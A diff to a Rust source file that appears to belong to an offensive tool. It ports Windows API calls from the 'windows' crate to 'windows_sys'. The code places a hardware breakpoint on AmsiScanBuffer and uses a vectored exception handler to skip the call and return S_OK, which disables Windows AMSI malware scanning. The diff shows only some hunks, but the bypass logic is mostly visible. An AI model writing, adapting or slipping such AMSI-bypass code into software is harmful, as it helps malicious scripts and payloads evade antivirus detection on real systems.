@@ -1,11 +1,13 @@
 use std::ffi::c_void;
 use tracing::{debug, error};
-use windows::Win32::Foundation::EXCEPTION_SINGLE_STEP;
-use windows::Win32::System::Diagnostics::Debug::{
-    AddVectoredExceptionHandler, CONTEXT, CONTEXT_FLAGS, EXCEPTION_POINTERS, GetThreadContext,
-    SetThreadContext,
+use windows_sys::Win32::System::Diagnostics::Debug::{
+    AddVectoredExceptionHandler, CONTEXT, EXCEPTION_POINTERS, GetThreadContext, SetThreadContext,
 };
-use windows::Win32::System::Threading::GetCurrentThread;
+use windows_sys::Win32::System::Threading::GetCurrentThread;
+
+const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
+const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
+const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;
 
 static mut TARGET_ADDR: usize = 0;
 
@@ -22,10 +24,10 @@ pub fn enable_hw_breakpoint(address: usize) -> bool {
         }
 
         let thread = GetCurrentThread();
-        let mut context = CONTEXT::default();
-        context.ContextFlags = CONTEXT_FLAGS(CONTEXT_DEBUG_REGISTERS);
+        let mut context: CONTEXT = std::mem::zeroed();
+        context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 
-        if GetThreadContext(thread, &mut context).is_err() {
+        if GetThreadContext(thread, &mut context) == 0 {
             error!("failed to get thread context");
             return false;
         }
@@ -33,7 +35,7 @@ pub fn enable_hw_breakpoint(address: usize) -> bool {
         context.Dr0 = address as u64;
         context.Dr7 = (context.Dr7 & !0x000F0003) | 0x00000001; // Enable Dr0, local, execution
 
-        if SetThreadContext(thread, &context).is_err() {
+        if SetThreadContext(thread, &context) == 0 {
             error!("failed to set thread context");
             return false;
         }
@@ -48,7 +50,7 @@ unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -
         let record = &*(*exception_info).ExceptionRecord;
         let context = &mut *(*exception_info).ContextRecord;
 
-        if record.ExceptionCode == EXCEPTION_SINGLE_STEP
+        if record.ExceptionCode as u32 == EXCEPTION_SINGLE_STEP
             && record.ExceptionAddress as usize == TARGET_ADDR
         {
             let amsi_result_ptr_addr = context.Rsp + 0x30;
@@ -64,9 +66,9 @@ unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -
             context.Rsp += 8;
 
             debug!("HW BP triggered at AmsiScanBuffer: redirected execution and returned S_OK");
-            return -1; // EXCEPTION_CONTINUE_EXECUTION
+            return EXCEPTION_CONTINUE_EXECUTION;
         }
     }
 
-    0 // EXCEPTION_CONTINUE_SEARCH
+    EXCEPTION_CONTINUE_SEARCH
 }
